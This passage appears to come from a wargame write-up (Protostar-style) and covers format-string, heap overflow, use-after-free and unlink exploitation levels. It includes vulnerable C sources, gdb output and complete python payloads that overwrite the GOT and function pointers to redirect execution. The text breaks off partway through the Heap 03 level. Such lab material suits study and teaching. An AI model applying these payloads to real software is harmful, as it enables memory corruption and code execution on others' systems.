  <li>The next step requires to write to the second-lowest byte pair. We repeat the spamming with a known patter appending it to the string that we already have. Note that we inserted also ‘BBBB’ in our spamming pattern, because on a first run just with ‘AAAA’ it looked like the bytes were not aligned properly to result in a clean address after the popping. After playing around, the right amount of pops is 8.
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%4x%x%x%x%x%x%x%x%x%x%x' + '%n' + 'AABBBBAA%x%x%x%x%x%x%x%x'"</span> <span class="o">&gt;</span> /tmp/format3.in
 ./format3 &lt; /tmp/format3.in
</code></pre></div>    </div>
  </li>
  <li>Our destination address is still the target address, but incremented by one as we are writing to a higher position. So, in our new string swap the pattern at the right position with the address, and replace the last ‘%x’ with ‘%n’. Another two bytes of target will be written.
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%04x%x%x%x%x%x%x%x%x%x%x' + '%n' + 'AA</span><span class="se">\x</span><span class="s2">f5</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08AA%473x%x%x%x%x%x%x' + '%n'"</span> <span class="o">&gt;</span> /tmp/format3.in
 ./format3 &lt; /tmp/format3.in
</code></pre></div>    </div>
  </li>
  <li>To get the right value in target we have to put a rather high value in the bytes printed by ‘%x’. This does not matter, even if it overflows, because we will be anyway overwriting the higher byte in the next step.</li>
  <li>
    <p>Repeat the last steps for the remaining bytes, remembering to increase the target address by one. When all the bytes are done and contain the right value, the challenge is done.</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%04x%x%x%x%x%x%x%x%x%x%x' + '%n' + 'AA</span><span class="se">\x</span><span class="s2">f5</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08AA%473x%x%x%x%x%x%x' + '%n' + 'BBB</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08%125x%x%x%x%x%x' + '%n'"</span> <span class="o">&gt;</span> /tmp/format3.in
 ./format3 &lt; /tmp/format3.in
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="format-04">[Format 04]</h3>
<p>Redirect execution in a process</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">target</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">hello</span><span class="p">(){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"code execution redirected! you win</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>

    <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>   
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="n">vuln</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>Global Offset Table: also called GOT, it is a table of addresses stored in the data section. During runtime it lists addresses of global variables: when the program runs for the first time, the GOT is initialized to 0x00000000 for every external function; the first time it runs that function, it will cache the actual memory address in the GOT, so that it doesn’t have to ask libc, or the corresponding library each time. To see the (uninitialized) GOT we can use objdump -R</p>
</blockquote>

<blockquote>
  <p>Buffer size: to overwrite an address, we need to know exactly how far we have to write in our buffer. To do this, we can take the target address (let’s say 0x080484b4) and split it in byte pairs (b4, 84, 08, 08 little endian).
We get the first offset by starting gdb, executing the program and looking at the content of the address of the function that we want to overwrite (this address is the one showed in the GOT). Let’s say the value is 0x00000010: take the first byte pair and subtract this value to get the buffer length, meaning 0xb4 - 0x10 = 164. For the second one, take the 2nd byte pair (84) and subtract the first byte pair (b4). To correct the negative result we add a “1” in the most significant digit of the first number, meaning “184”. We then subtract again, and get 208.
Doing this for all pairs results in the offsets that are needed to make the overwriting work at the correct places.</p>
</blockquote>

<blockquote>
  <p>Direct Parameter Access: It allows us to reference subsequent printf arguments, without using the prior arguments: printf(“%4$d”, 1, 2, 3, 4, 5) will print 4.</p>
</blockquote>

<ol>
  <li>
    <p>The challenge is exactly the same as in the previous level, but instead of overwriting a variable we have to overwrite an address to which we want to jump. This address is the one of the <code class="language-plaintext highlighter-rouge">exit()</code> method (not _exit, as that would be called only after the exploit has already been done), that we can retrieve from the GOT table. The new address, meaning the one of the <code class="language-plaintext highlighter-rouge">hello()</code> method, is found with the usual command.</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> objdump <span class="nt">-R</span> format4 | <span class="nb">grep exit</span> <span class="c"># target address is 0x08049724</span>
 objdump <span class="nt">-t</span> format4 | <span class="nb">grep </span>hello <span class="c"># new address is 0x080484b4</span>
</code></pre></div>    </div>
  </li>
  <li>There might be a little trick in the address of exit: if the method has never been executed before, what we get with the lookup is only the position in the GOT table. To actually know where the method is we need to fire up gdb, start up the program and look into what is in that address using <code class="language-plaintext highlighter-rouge">x/i 0x08049724</code></li>
  <li>Although it might be worth looking, executing format4 at least once before inspecting the GOT table should solve the problem. If you reach the end and there stuff is not working, maybe take a look at the last step and check that you are working with the proper address.</li>
  <li>Next steps are exactly like format3: iteratively spam with a known pattern to find where to put the target address and how many pops are needed; actually insert the address and swap the last ‘%x’ with ‘%n’, check how many additional bytes you need to get the correct value at the desired place.</li>
  <li>As we don’t have a variable that will be printed with our results, checking that we are writing the right values at the right positions will require using gdb and constantly checking with <code class="language-plaintext highlighter-rouge">gdb &gt; x/x 0x08049724</code></li>
  <li>
    <p>The finished payload looks like the following:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python <span class="nt">-c</span> <span class="s2">"print '</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + '%160x%x%x' + '%n' + 'A</span><span class="se">\x</span><span class="s2">25</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08BBB' + '%184x%x%x' + '%n' + 'AA</span><span class="se">\x</span><span class="s2">26</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08AA' + '%352x%x%x%x' + '%n' + 'A</span><span class="se">\x</span><span class="s2">27</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08CDD' + '%228x%x%x%x' + '%n'"</span> <span class="o">&gt;</span> /tmp/format4.in
 ./format4 &lt; /tmp/format4.in
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="heap-00">[Heap 00]</h3>
<p>Heap overflow to influence code flow</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">data</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">fp</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
<span class="p">};</span>

<span class="kt">void</span> <span class="nf">winner</span><span class="p">(){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"level passed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">nowinner</span><span class="p">(){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"level has not been passed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="k">struct</span> <span class="n">data</span> <span class="o">*</span><span class="n">d</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">fp</span> <span class="o">*</span><span class="n">f</span><span class="p">;</span>

    <span class="n">d</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">data</span><span class="p">));</span>
    <span class="n">f</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">fp</span><span class="p">));</span>
    <span class="n">f</span><span class="o">-&gt;</span><span class="n">fp</span> <span class="o">=</span> <span class="n">nowinner</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"data is at %p, fp is at %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>

    <span class="n">strcpy</span><span class="p">(</span><span class="n">d</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    
    <span class="n">f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>void* malloc( size_t size ): allocates size bytes of uninitialized storage in the heap. If allocation succeeds, returns a pointer to the first byte in the allocated memory block that is suitably aligned for any object type.</p>
</blockquote>

<ol>
  <li>The core of this challenge is that the structs are initialized using malloc to be allocated in the heap. Structs d and f are allocated immediately after another, meaning that overflowing d results in overwriting f.</li>
  <li>Our goal is to overwrite the function pointer defined in f with the address of the winner method. That address can be retrieved with <code class="language-plaintext highlighter-rouge">objdump -t heap0 | grep winner</code> and corresponds to 0x08048464</li>
  <li>
    <p>The next step is to find out how long does the input that is used to initialize d need to be to overwrite f and its function pointer. We use the same technique that we used for the stack challenges: run the program with gdb and the pattern:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> gdb <span class="nt">--args</span> heap0 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
</code></pre></div>    </div>
  </li>
  <li>We can see what the content of $eip is when the program goes into segmentation fault, and passing this value back to the website tells us that we have an offset of 72 bytes.</li>
  <li>The difference between this attack and the stack overflow attacks is that in this case we are not overwriting the return address in the stack, instead we are overwriting the content of f-&gt;fp. This means that the segmentation fault does not aries when returning from the strcpy call, but only at the moment when we try to call f-&gt;fp() and the pointer contained there (and stored in the heap) is not a proper address.</li>
  <li>
    <p>So what we have to do is pass to heap0 72 bytes of padding, and then the address of the winner method (remembering endianness):</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./heap0 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print 'A' * 72 + '</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'"</span><span class="sb">`</span>
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="heap-01">[Heap 01]</h3>
<p>Code flow hijacking in data overwrite cases.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">internet</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">priority</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
<span class="p">};</span>

<span class="kt">void</span> <span class="nf">winner</span><span class="p">(){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"and we have a winner @ %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="k">struct</span> <span class="n">internet</span> <span class="o">*</span><span class="n">i1</span><span class="p">,</span> <span class="o">*</span><span class="n">i2</span><span class="p">,</span> <span class="o">*</span><span class="n">i3</span><span class="p">;</span>

    <span class="n">i1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">internet</span><span class="p">));</span>
    <span class="n">i1</span><span class="o">-&gt;</span><span class="n">priority</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">i1</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>

    <span class="n">i2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">internet</span><span class="p">));</span>
    <span class="n">i2</span><span class="o">-&gt;</span><span class="n">priority</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>

    <span class="n">strcpy</span><span class="p">(</span><span class="n">i1</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"and that's a wrap folks!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>The overflow in this case is expected to happen when assigning the name to the internet objects: the allocated space for the names is at most 8 characters, but there are no checks in place that the length of the input actually corresponds. Also, each struct contains a name pointer that is allocated separately, meaning that we can expect the heap to be structured as follows: <code class="language-plaintext highlighter-rouge">[i1 struct][i1-&gt;name][i2 struct][i2-&gt;name]</code></li>
  <li>Playing with input we realize that we can cause a segmentation fault with too long names. So back at our nice offset-calculating service, we pass the arguments at gdb, run it and retrieve the address causing the segfault. After feeding it back to the offset service, we are nicely informed that our segfault happens at 20 bytes of input.</li>
  <li>The overflowed ‘i2-&gt;name’ field means that we can control the destination for the second strcpy command. This means that we should redirect the return address of main on the stack with the memory address of winner, that we can retrieve with the usual objdump and corresponds to 0x08048494.</li>
  <li>
    <p>To find the location of the return address, we use <code class="language-plaintext highlighter-rouge">gdb &gt; disassemble main</code>, put a breakpoint at the ret instruction, and when the breakpoint is reached look at what is the content of $esp:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> gdb <span class="o">&gt;</span> disas main
 gdb <span class="o">&gt;</span> b <span class="k">**</span>0x08048567
 gdb <span class="o">&gt;</span> run asdf asdf
 gdb <span class="o">&gt;</span> i r <span class="nv">$esp</span>
</code></pre></div>    </div>
  </li>
  <li>From gdb we know that $esp contains the return address 0xbffff68c. We have to keep in mind that when not using gdb, the addresses will not correspond exactly to what we have seen using the debugger. Therefore, the return address will not be precise.</li>
  <li>A workaround for this is to repeatedly write our own target address starting from a bit before what gdb told us, and continuing a bit after. With this approach, we are sure that at some point we will be writing at the right location.</li>
  <li>
    <p>The first argument is made by the 20 random bytes and a address lower than our known gdb-related return address, than we need a space to respect the syntax of the heap1 program, and then we have a sled of our target address. At some point the target address will be hit and we will reach the winner method.</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./heap1 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print 'A' * 20 + '</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">bf' + ' ' + '</span><span class="se">\x</span><span class="s2">94</span><span class="se">\x</span><span class="s2">84</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' * 8"</span><span class="sb">`</span>
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="heap-02">[Heap 02]</h3>
<p>What can happen when heap pointers are stale? (This level is completed when you see the “you have logged in already!” message)</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">auth</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">auth</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">auth</span> <span class="o">*</span><span class="n">auth</span><span class="p">;</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">service</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>

    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[ auth = %p, service = %p ]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">auth</span><span class="p">,</span> <span class="n">service</span><span class="p">);</span>

        <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
        
        <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"auth "</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">auth</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">auth</span><span class="p">));</span>
            <span class="n">memset</span><span class="p">(</span><span class="n">auth</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">auth</span><span class="p">));</span>
            <span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">31</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">strcpy</span><span class="p">(</span><span class="n">auth</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">line</span> <span class="o">+</span> <span class="mi">5</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"reset"</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">free</span><span class="p">(</span><span class="n">auth</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"service"</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">service</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">7</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"login"</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="n">auth</span><span class="o">-&gt;</span><span class="n">auth</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"you have logged in already!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"please enter your password</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>Use after free: this vulnerability is a type of memory corruption that corresponds to trying to access memory after it has been freed. This can cause a program to crash or to execute arbitrary code in case the freed memory has already been filled with new data.</p>
</blockquote>

<blockquote>
  <p>int strncmp(const char *str1, const char *str2, size_t n): compares at most the first n bytes of str1 and str2, returning 0 if they are equal.</p>
</blockquote>

<blockquote>
  <p>char *strdup(const char *str1): returns a pointer to a null-terminated byte string, which is a duplicate of the string pointed to by str1. The pointer is to a newly allocated chunk of memory in the heap</p>
</blockquote>

<ol>
  <li>This program offers different commands that can be used in a loop: auth (+ arg), reset, service (+ arg), and login. Depending on the order these commands are issued, it is possible to cause an use-after-free problem: first invoking auth, then freeing it with reset, then attempting login will result in the last command accessing auth-&gt;auth when that memory is not allocated for that use anymore.</li>
  <li>Our goal is to fill the original auth struct with 1s, so that when checking auth-&gt;auth during the login, the conditional will recognize us as already logged in.</li>
  <li>Based on the fact that in the heap the space is allocated sequentially, putting new chunks immediately after already allocated ones, we can run our commands so that the following happens: we call auth to allocate the memory needed for that struct; then we call reset to free it. However, the “auth” pointer still exists in the program, although it should not be used anymore.</li>
  <li>
    <p>The next step is to call service and pass it a bunch of ‘1’: service will call strdup, which allocates space in the memory just freed by releasing auth. As last, we call login: the auth pointer will be used as if the respective memory was still legitimately in use, and if we passed enough 1s with the service call, one of those 1 will be interpreted as auth-&gt;auth, allowing us to get in.</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./heap2
     <span class="o">[</span> auth <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span>, service <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
 auth AAAAAAAA
     <span class="o">[</span> auth <span class="o">=</span> 0x804c008, service <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
 reset
     <span class="o">[</span> auth <span class="o">=</span> 0x804c008, service <span class="o">=</span> <span class="o">(</span>nil<span class="o">)</span> <span class="o">]</span>
 service 11111111111111111111111111111
     <span class="o">[</span> auth <span class="o">=</span> 0x804c008, service <span class="o">=</span> 0x804c018 <span class="o">]</span>
 login
 you have logged <span class="k">in </span>already!
     <span class="o">[</span> auth <span class="o">=</span> 0x804c008, service <span class="o">=</span> 0x804c018 <span class="o">]</span>
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="heap-03">[Heap 03]</h3>
<p>How heap meta data can be modified to change program execution.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">winner</span><span class="p">(){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"that wasn't too bad now, was it? @ %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">*</span><span class="n">b</span><span class="p">,</span> <span class="o">*</span><span class="n">c</span><span class="p">;</span>

    <span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
    <span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>

    <span class="n">strcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"dynamite failed?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>Malloc chunk: Let’s look at the structure of a free chunk of heap memory, as interpreted in malloc instructions:</p>

  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  struct malloc_chunk {
       INTERNAL_SIZE_T     prev_size;
       INTERNAL_SIZE_T     size;
       struct malloc_chunk*    fd;
       struct malloc_chunk*    bk;
   }
</code></pre></div>  </div>

  <p>The prev_size member contains the size of the chunk previous to the current chunk. It is only used if the previous chunk is free.
       The size member contains the size of the current chunk, allocated in multiples of 8 bytes. This means that the 3 lowest bits of the size member will always be 0, and are therefore used as flag values:
       - A (0x04): Allocated Arena - if this bit is 0, the chunk comes from the main arena and the main heap. If this bit is 1, the chunk comes from mmap’d memory and the location of the heap can be computed from the chunk’s address.
       - M (0x02): MMap’d chunk - this chunk was allocated with a single call to mmap and is not part of a heap at all.
       - P (0x01): Previous chunk is in use - if set, the previous chunk is still being used by the application, and thus the prev_size field is invalid. This bit really means that the previous chunk should not be considered a candidate for coalescing.
       The fd and bk members are pointers to the next and previous chunks respectively and are only set when the chunk itself is freed and consequently added to a doubly linked free list that is used to track which chunks are currently free.</p>
</blockquote>

<blockquote>
  <p>ulink() technique: upon calling free, the previous and following chunks are tested to see if they are in use (looking at the prev_size member). Adjacent free chunks will be consolidated together as a single chunk.
Actual ulink operations are:</p>
  <ul>
    <li>writing the value of P-&gt;bk to the memory address pointed to by (P-&gt;fd) + 12, which corresponds to the bk member of P-&gt;fd.</li>
    <li>writing the value of P-&gt;fd to the memory address pointed to by (P-&gt;bk) + 8, which corresponds to the fd member of P-&gt;bk.
This means that controlling the values of P-&gt;bk and P-&gt;fk allows to write arbitrary data to an arbitrary location in memory.</li>
  </ul>
</blockquote>

<ol>
  <li>We know that a, b, and c will be allocated on the heap. Let’s start gdb, but a breakpoint after the three allocation have been done and the input copied there, and take a look. To get the address, we can run info proc map and gdb will tell us where the heap starts. That’s where we want to look.
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">(</span>gdb<span class="o">)</span> x/50x 0x804c000
     0x804c000:  0x00000000  0x00000029  0x41414141  0x00000000
     0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
     0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
     0x804c030:  0x42424242  0x00000000  0x00000000  0x00000000
     0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
     0x804c050:  0x00000000  0x00000029  0x43434343  0x00000000
     0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
     0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
     0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
     0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
     0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
     0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
     0x804c0c0:  0x00000000  0x00000000
</code></pre></div>    </div>
  </li>
  <li>
    <p>For each variable, we see that the size member is 0x00000029. This correponds to 00101001 in binary, meaning that the size is 40 bytes and that the previous chunk is in use. We now let gdb run until the three chunks of memory are freed, and then we take a look at the heap again:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">(</span>gdb<span class="o">)</span> x/50x 0x804c000
     0x804c000:  0x00000000  0x00000029  0x0804c028  0x00000000
     0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
